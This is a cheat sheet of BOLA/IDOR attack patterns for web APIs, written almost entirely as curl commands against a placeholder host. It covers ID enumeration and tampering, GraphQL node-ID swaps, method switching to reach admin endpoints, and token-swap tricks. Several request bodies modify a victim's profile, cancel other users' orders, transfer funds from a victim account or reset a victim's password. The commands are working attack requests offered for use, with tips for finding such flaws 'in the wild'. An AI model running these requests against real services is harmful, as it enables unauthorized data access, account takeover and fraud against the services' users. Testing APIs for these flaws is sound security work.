# BOLA / IDOR Test Patterns — Real-World API Testing
# OWASP API Security: API1 — Broken Object Level Authorization
# Severity: HIGH to CRITICAL

# ============================================================
# 1. NUMERIC ID MANIPULATION
# ============================================================

# Increment / Decrement
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/100/profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/101/profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/99/profile

# Boundary values
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/0/profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/1/profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/-1/profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/999999999/profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" https://api.target.com/api/v1/users/2147483647/profile

# ============================================================
# 2. UUID ENUMERATION
# ============================================================

# If UUIDs are sequential (v1) — extract timestamp and MAC, predict next
# v1 UUID format: timeLow-timeMid-timeHighAndVersion-clockSeq-node
# Example: 6ba7b810-9dad-11d1-80b4-00c04fd430c8

# Capture UUID from your own account, try other users':
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/users/6ba7b810-9dad-11d1-80b4-00c04fd430c8
# Increment the time portion:
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/users/6ba7b811-9dad-11d1-80b4-00c04fd430c8

# Check if UUID is in response headers, other API responses, or public profiles
# Many apps leak user UUIDs in: comments, reviews, public profiles, shared links

# Try null UUID
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/users/00000000-0000-0000-0000-000000000000

# ============================================================
# 3. ENCODED ID MANIPULATION
# ============================================================

# Base64 encoded IDs
# Original: eyJ1c2VyX2lkIjogMTAwfQ== → {"user_id": 100}
# Tampered: eyJ1c2VyX2lkIjogMTAxfQ== → {"user_id": 101}
echo '{"user_id": 101}' | base64
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/data?ref=eyJ1c2VyX2lkIjogMTAxfQ==

# Hex encoded IDs
# 0x64 = 100, try 0x65 = 101
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/orders/0x65

# Hashed IDs (MD5/SHA1 of sequential integers)
# md5("100") = f899139df5e1059396431415e770c6dd
# md5("101") = 38b3eff8baf56627478ec76a704e9b52
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/docs/38b3eff8baf56627478ec76a704e9b52

# ============================================================
# 4. GRAPHQL NODE ID MANIPULATION
# ============================================================

# GraphQL Relay global IDs are base64("TypeName:id")
# base64("User:100") = VXNlcjoxMDA=
# base64("User:101") = VXNlcjoxMDE=

# Query with tampered node ID:
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"query": "{ node(id: \"VXNlcjoxMDE=\") { ... on User { id email name } } }"}'

# Enumerate types:
# base64("Order:500")  = T3JkZXI6NTAw
# base64("Invoice:200") = SW52b2ljZToyMDA=

# ============================================================
# 5. PATH PARAMETER IDOR
# ============================================================

# User profile
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_B_ID/profile
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_B_ID/settings
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_B_ID/orders
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_B_ID/payment-methods

# Nested resources
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/organizations/ORG_B/members
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/projects/PROJ_B/files
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/teams/TEAM_B/settings

# File / document access
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/documents/DOC_B_ID/download
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/attachments/ATT_B_ID

# ============================================================
# 6. QUERY PARAMETER IDOR
# ============================================================

curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/orders?user_id=OTHER_USER"
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/invoices?account_id=OTHER_ACCOUNT"
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/reports?owner=OTHER_USER"
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/messages?recipient_id=OTHER_USER"
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/export?user=OTHER_USER&format=csv"

# ============================================================
# 7. POST BODY IDOR
# ============================================================

# Modify user_id / account_id in request body
curl -X POST https://api.target.com/api/v1/profile/update \
  -H "Authorization: Bearer <USER_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "USER_B_ID", "name": "pwned"}'

# Order manipulation
curl -X POST https://api.target.com/api/v1/orders/cancel \
  -H "Authorization: Bearer <USER_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"order_id": "OTHER_USERS_ORDER_ID"}'

# Transfer / payment
curl -X POST https://api.target.com/api/v1/transfer \
  -H "Authorization: Bearer <USER_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"from_account": "VICTIM_ACCOUNT", "to_account": "ATTACKER_ACCOUNT", "amount": 1000}'

# ============================================================
# 8. HTTP METHOD SWITCH
# ============================================================

# Some endpoints only check auth on certain methods
# Original (blocked):
curl -X GET -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users
# Try:
curl -X POST -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users
curl -X PUT -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users
curl -X PATCH -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users
curl -X DELETE -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users/VICTIM_ID
curl -X OPTIONS -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users
curl -X HEAD -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/admin/users

# ============================================================
# 9. HORIZONTAL VS VERTICAL PRIVILEGE ESCALATION
# ============================================================

# HORIZONTAL: same role, different user's data
# User A accessing User B's resources (same privilege level)
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/users/USER_B_ID/orders

# VERTICAL: lower role accessing higher role's functions
# Regular user accessing admin endpoints
curl -H "Authorization: Bearer <REGULAR_USER_TOKEN>" https://api.target.com/api/admin/dashboard
curl -H "Authorization: Bearer <REGULAR_USER_TOKEN>" https://api.target.com/api/admin/users
curl -H "Authorization: Bearer <REGULAR_USER_TOKEN>" https://api.target.com/api/admin/settings
curl -H "Authorization: Bearer <REGULAR_USER_TOKEN>" https://api.target.com/api/internal/metrics

# ============================================================
# 10. MULTI-STEP / TOKEN SWAP IDOR
# ============================================================

# Step 1: Get a valid reference/token from your own account
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_A_ID/export-token
# Response: {"export_token": "abc123"}

# Step 2: Use that token mechanism but for another user
curl "https://api.target.com/api/v1/export?token=abc123&user_id=USER_B_ID"

# Password reset token swap
# Step 1: Request reset for your email
curl -X POST https://api.target.com/api/auth/reset -d '{"email": "attacker@test.com"}'
# Step 2: Use the reset flow but swap the email/user_id
curl -X POST https://api.target.com/api/auth/reset/confirm \
  -d '{"token": "YOUR_RESET_TOKEN", "email": "victim@target.com", "new_password": "hacked123"}'

# Invite/share token manipulation
# Step 1: Create a share link for your own resource
curl -X POST -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/shares \
  -d '{"resource_id": "YOUR_DOC", "access": "edit"}'
# Step 2: Change resource_id to someone else's
curl -X POST -H "Authorization: Bearer <TOKEN>" https://api.target.com/api/shares \
  -d '{"resource_id": "VICTIM_DOC", "access": "edit"}'

# ============================================================
# 11. TIPS FOR FINDING IDOR IN THE WILD
# ============================================================

# - Map every endpoint and parameter that references an object (id, user_id, doc_id, etc.)
# - Create two accounts (User A, User B) and swap tokens/IDs between them
# - Check API responses for leaked IDs (other users' IDs in paginated responses, search results)
# - Check JavaScript source for API endpoint patterns
# - Monitor WebSocket messages for object references
# - Test both authenticated and unauthenticated access
# - Try removing the Authorization header entirely
# - Try replacing Bearer token with an empty string or "null"
